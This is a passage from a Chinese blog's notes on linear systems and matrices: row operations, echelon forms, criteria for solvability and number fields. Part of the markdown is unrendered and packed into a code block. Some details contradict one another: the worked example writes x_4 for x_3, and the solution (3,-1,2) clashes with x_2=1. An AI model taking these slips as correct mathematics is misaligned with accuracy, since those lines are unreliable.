\dots &amp; a_{2n}  \<br>\vdots &amp; \vdots &amp; \ddots&amp; \vdots  \<br>a_{s1} &amp; a_{s2} &amp; \dots &amp; a_{sn}<br>\end{bmatrix}<br>$$<br><strong>增广矩阵</strong>：提取方程组的系数和常数项做为一个矩阵，这样的矩阵叫做<strong>增广矩阵</strong><br>$$<br>\begin{bmatrix}<br>a_{11} &amp; a_{12} &amp; \dots &amp; a_{1n} &amp; b_{1} \<br>a_{21} &amp; a_{22} &amp; \dots &amp; a_{2n} &amp; b_{2} \<br>\vdots &amp; \vdots &amp; \ddots&amp; \vdots &amp; \vdots \<br>a_{s1} &amp; a_{s2} &amp; \dots &amp; a_{sn} &amp; b_{s}<br>\end{bmatrix}<br>$$<br><strong>矩阵的定义</strong>：</p><p>由<code>s·m</code>个数排成<code>s</code>行、<code>m</code>列的一张表称为一个<code>s×m</code>矩阵，其中的每一个数称为这个矩阵的<strong>一个元素</strong>，第<code>i</code>行与第<code>j</code>列交叉位置的元素称为矩阵的<code>(s,j)</code>元。</p><p>注解1：矩阵通常用大写英文字母$\mathbf{A,B,C,…}$表示。一个<code>s×m</code>矩阵可以简单地记作$\mathbf{A}<em>{s×m}$，它的<code>(i,j)</code>元记作$\mathbf{A}(i;j)$，如果矩阵$\mathbf{A}$的<code>(i,j)</code>元是$a</em>{ij}$，那么可以记作$\mathbf{A}=(a_{ij})$</p><p>注解2：元素全为0的矩阵称为<strong>零矩阵</strong>，简记作$\mathbf{0}$。s行m列的零矩阵可以记成$\mathbf{0}_{s×m}$</p><p>注解3：如果一个矩阵$\mathbf{A}$的行数与列数相等，则称它为<strong>方阵</strong>。m行n列的方阵也称为<strong>m级矩阵</strong></p><p>注解4：对于两个矩阵$\mathbf{A,B}$，如果它们的行数相等，都等于<code>s</code>；列数相等，都等于<code>m</code>；并且$\mathbf{A}(i;j)=\mathbf{B}(i;j),i=1,2,…,s,~~~j=1,2,…,m$，那么称矩阵$\mathbf{A,B}$相等，记作$\mathbf{A=B}$</p></blockquote><blockquote><p>例题1：解方程组<br>$$<br>\begin{cases}<br>x_1+3x_2+x_3&amp;=2\<br>3x_1+4x_2+2x_3&amp;=9\<br>-x_1-5x_2+4x_4&amp;=10\<br>2x_1+7x_2+x_3&amp;=10<br>\end{cases}<br>$$</p></blockquote><ol><li><p>先使用<code>2式+1式·(-3)</code>、<code>3式+1式</code>、<code>4式+1式·(-2)</code>，消去<code>2、3、4式</code>的$x_1$，然后交换<code>2式和4式</code>的位置</p></li><li><p>再使用<code>3式+2式·2</code>、<code>4式+2式·5</code>，以及<code>4式+3式·2</code>得到了一个<strong>阶梯型方程组</strong></p></li></ol><p>$$<br>\begin{cases}<br>x_1+3x_2+x_3&amp;=2\</p><pre><code class="language-x_2-x_3&amp;=-3\">~~~~~~~~~~~~~~~~~~~~x_3&amp;=6\\~~~~~~~~~~~~~~~~~~~~~0&amp;=0\end&#123;cases&#125;$$3. 最后使用$3式·\frac&#123;1&#125;3&#123;&#125;$、`1式+3式·(-1)`、`2式+3式`、`1式+2式·(-3)`就可以得到**简化阶梯形方程组**，并且可以看出该方程组的解为$(3,-1,2)'$$$\begin&#123;cases&#125;x_1~~~~&amp;=3\\~~~~~~x_2&amp;=1\\~~~~~~~~~~~~~x_3&amp;=2\\~~~~~~~~~~~~~~0&amp;=0\end&#123;cases&#125;$$## 线性方程组求解与矩阵化简&gt;**线性方程组的初等变换**：&gt;&gt;1. 把一个方程的倍数加到另一个方程上&gt;2. 互换两个方程的位置&gt;3. 用一个非零数称某一个方程&gt;&gt;注解：通过线性方程组初等变换后的方程组的解与原方程组相同，所以使用有限次数的线性方程组的初等变换就可以求出n元线性方程组的解。&gt;**矩阵的初等行变换**：&gt;&gt;由于矩阵是线性方程组抽象出来的，所以线性方程组的初等变换运用到矩阵就是矩阵的初等行变换&gt;&gt;1. 把一行的倍数加到另一行上&gt;2. 互换两行的位置&gt;3. 用一个非零数乘某一行&gt;&gt;&gt;&gt;**矩阵的行阶梯**：&gt;&gt;阶梯型方程组转换成矩阵形式，就变成了**矩阵的行阶梯**，有以下几个特征：&gt;&gt;1. 元素全为`0`的行（称为**零行**）在下方(如果有零行)；&gt;2. 元素不全为`0`的行（称为**非零行**），从左边数起第一个不为0的元素称为**主元**，它们的列指标随着行指标的递增而**严格增大**。即行指标增大`1`，列指标也需要增大`1`而不是增大`2`&gt;&gt;$$&gt;\begin&#123;bmatrix&#125;&gt;1&amp;3&amp;1&amp;2\\&gt;0&amp;1&amp;-1&amp;-3\\&gt;0&amp;0&amp;3&amp;6\\&gt;0&amp;0&amp;0&amp;0&gt;\end&#123;bmatrix&#125;&gt;$$&gt;&gt;&gt;&gt;**简化行阶梯形矩阵**：&gt;&gt;简化阶梯形方程组抽象成矩阵形式就变成了简化行阶梯形矩阵，特点如下：&gt;&gt;1. 它阶梯形矩阵&gt;2. 每个非零行的主元都是1&gt;3. 每个主元所在的列的其余元素都是0&gt;&gt;$$&gt;\begin&#123;bmatrix&#125;&gt;1&amp;0&amp;0&amp;3\\&gt;0&amp;1&amp;0&amp;-1\\&gt;0&amp;0&amp;1&amp;2\\&gt;0&amp;0&amp;0&amp;0&gt;\end&#123;bmatrix&#125;&gt;$$&gt;&gt;**定理1**：&gt;&gt;任意一个矩阵都可以经过一系列初等行变换化成**阶梯型矩阵**&gt;&gt;&gt;&gt;**推理1**：&gt;&gt;任意一个矩阵都可以经过一系列初等行变换化成**简化行阶梯形矩阵**&gt;&gt;&gt;&gt;**矩阵解线性方程组**：&gt;&gt;将方程组转换为增广矩阵后，通过初等行变换化成**阶梯型矩阵**，再化成**简化行阶梯形矩阵**就是解线性方程组。&gt;例题2：使用矩阵解方程组&gt;$$&gt;\begin&#123;cases&#125;&gt;x_1+3x_2+x_3&amp;=2\\&gt;3x_1+4x_2+2x_3&amp;=9\\&gt;-x_1-5x_2+4x_4&amp;=10\\&gt;2x_1+7x_2+x_3&amp;=10&gt;\end&#123;cases&#125;&gt;$$![image-20250825144013357](高等代数-线性方程组/image-20250825144013357.png)# 线性方程组解的情况与判别&gt;**线性方程组解的情况**：&gt;&gt;系数和常数项为有理数（或实数，或复数）的n元线性方程组的解的情况有且只有三种可能：无解，有唯一解，有无穷多个解。&gt;&gt;注解：如果一个线性方程组有解，那么称它是**相容的**；否则，称它是**不相容的**&gt;&gt;&gt;&gt;**线性方程组解的判别**：&gt;&gt;把n元线性方程组的增广矩阵经过初等行变换化成阶梯形矩阵，如果相应的阶梯型方程组出现`0=d(其中d是非零数)`，这种方程，那么原方程无解；否则，有解。&gt;&gt;当有解的时候，如果阶梯形矩阵的非零行数目`r`等于未知量数目`n`，那么原方程组有唯一解，如果`r&lt;n`那么原方程有无穷多个解。&gt;&gt;注解：当原方程有无穷多个解的时候，简化的行阶梯形矩阵就会出现如下形式&gt;$$&gt;\begin&#123;bmatrix&#125;&gt;1&amp;-1&amp;0&amp;2\\&gt;0&amp;0&amp;1&amp;-1\\&gt;0&amp;0&amp;0&amp;0&gt;\end&#123;bmatrix&#125;&gt;$$&gt;转换成线性方程组后就如下：&gt;$$&gt;\begin&#123;cases&#125;&gt;x_1-x_2&amp;=2\\&gt;x_3&amp;=1\\&gt;0&amp;=0&gt;\end&#123;cases&#125;&gt;$$&gt;之后化简就如下,下面表达式其实就是原线性方程组的**一般解**，其中行阶梯矩阵对应的主元为系数的未知量$x_1,x_3$称为**主变量**，其余未知量$x_2$称为**自由未知量**：&gt;$$&gt;\begin&#123;cases&#125;&gt;x_1&amp;=x_2+2\\&gt;x_3&amp;=1\\&gt;0&amp;=0&gt;\end&#123;cases&#125;&gt;$$&gt;&gt;&gt;&gt;&gt;**齐次线性方程组**：&gt;&gt;常数项全为0的线性方程组称为**齐次线性方程组**。`(0,0,...,0)`是齐次线性方程组的一个解，称为**零解**。其余的解（如果有）称为**非零解**。该方程如下图所示，由于常数项全为`0`，所以在将其转换为矩阵的求解时，只需要使用**系数矩阵**即可：&gt;$$&gt;\begin&#123;cases&#125;&gt;a_&#123;11&#125;x_1+a_&#123;12&#125;x_2+...+a_&#123;1n&#125;x_n &amp;= 0 \\&gt;a_&#123;21&#125;x_1+a_&#123;22&#125;x_2+...+a_&#123;2n&#125;x_n &amp;= 0\\&gt;~~~~~~\vdots~~~~~~~~~~~~~\vdots~~~~~~~~~~~~~~~~~~~~\vdots&amp;~~~~~~\vdots\\&gt;a_&#123;s1&#125;x_1+a_&#123;s2&#125;x_2+...+a_&#123;sn&#125;x_n&amp;=0&gt;\end&#123;cases&#125;&gt;$$&gt;**推论1**：n元齐次线性方程组有非零解的充分必要条件是：它的系数矩阵经过初等行变换化成的阶梯形矩阵中，非零行的数目`r&lt;n`&gt;&gt;**推论2**：n元齐次线性方程组，如果方程组的数目s小于未知量的数目n，那么它一定有非零解。&gt;**高斯-若尔当算法**：&gt;&gt;![image-20250826131015073](高等代数-线性方程组/image-20250826131015073.png)&gt;&gt;# 数域&gt;**定义1**：&gt;&gt;复数集的一个子集K如果满足，那么就称K是一个**数域**，有理数集`Q`，实数集`R`，复数集`C`都是数域：&gt;&gt;1. $0,1\in K$&gt;2. $a,b\in K \Rightarrow a\pm b,ab\in K$，$a,b\in K,b\not=0 \Rightarrow \frac&#123;a&#125;&#123;b&#125;\in K$&gt;&gt;注解1：复数域是最大的数域。在讨论线性方程组有没有解时，都是在一个给定的数域K里讨论，称`数域K上的线性方程组`，即它的系数和常数项都属于K，且它的解（若存在）是K中的数组成的有序数组。&gt;&gt;注解2：讨论矩阵问题时，也是在一个给定的数域K里进行，称`数域K上的矩阵`。&gt;&gt;&gt;&gt;**命题1**：&gt;&gt;任一数域都包含有理数域# 补充题(未完成)+ 补充题想了有点久暂时不想，先鸽这边。有灵感就马上写了。1. 解下列线性方程组。$$\begin&#123;cases&#125;(1+a_1)x_1+x_2+x_3+...+x_n&amp;=b_1\\x_1+(1+a_2)x_2+x_3+...+x_n&amp;=b_2\\\dots~~~\dots~~~\dots~~~\dots~~~\dots~~~\dots&amp;\dots\\x_1+x_2+x_3+...+(1+a_n)x_n&amp;=b_n\end&#123;cases&#125;$$2. 解下列线性方程组$$\begin&#123;cases&#125;x_1+2x_2+3x_3+...+(n-1)x_&#123;n-1&#125;+nx_n&amp;=b_1\\nx_1+x_2+2x_3+...+(n-2)x_&#123;n-1&#125;+(n-1)x_n&amp;=b_2\\\dots~~~\dots~~~\dots~~~\dots~~~\dots~~~\dots~~~~~\dots\\2x_1+3x_2+4x_3+...+nx_&#123;n-1&#125;+x_n&amp;=b_n\end&#123;cases&#125;$$3. 解下列方程组$$\begin&#123;cases&#125;x_1+x_2+...+x_n&amp;=1\\~~~~~~~~~x_2+...+x_&#123;n&#125;+x_&#123;n+1&#125;&amp;=2\\~~~~~~~~~~~~~~~\dots~~~\dots~~~\dots~~~\dots~~~\dots~~~\dots~~~~~\dots\\~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~x_&#123;n+1&#125;+x_&#123;n+2&#125;+...+x_&#123;2n&#125;&amp;=n+1\end&#123;cases&#125;$$</code></pre>]]></content>
    
    
    <summary type="html">前言：高等代数</summary>
    
    
    
    <category term="数学" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/"/>
    
    <category term="高等代数" scheme="http://iyheart.github.io/categories/%E6%95%B0%E5%AD%A6/%E9%AB%98%E7%AD%89%E4%BB%A3%E6%95%B0/"/>
    
    
  </entry>
  
</feed>
